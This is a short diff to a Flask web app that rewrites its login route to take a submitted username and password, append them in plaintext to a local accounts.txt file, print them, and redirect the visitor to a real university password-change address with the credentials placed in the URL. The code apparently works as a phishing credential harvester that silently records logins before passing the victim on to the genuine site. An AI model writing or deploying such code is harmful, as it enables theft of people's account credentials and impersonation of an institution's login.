@@ -1,9 +1,15 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request, redirect
 app = Flask(__name__)
 
-@app.route("/login")
+@app.route("/login",methods=['POST'])
 def login():
-    return "login"
+    username = request.form['username']
+    password = request.form['password']
+    with open("accounts.txt", "a") as myfile:
+        myfile.write(username + " " + password + "\n")
+    s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
+    print(s)
+    return redirect(s, code=302)
 
 @app.route("/")
 def index():
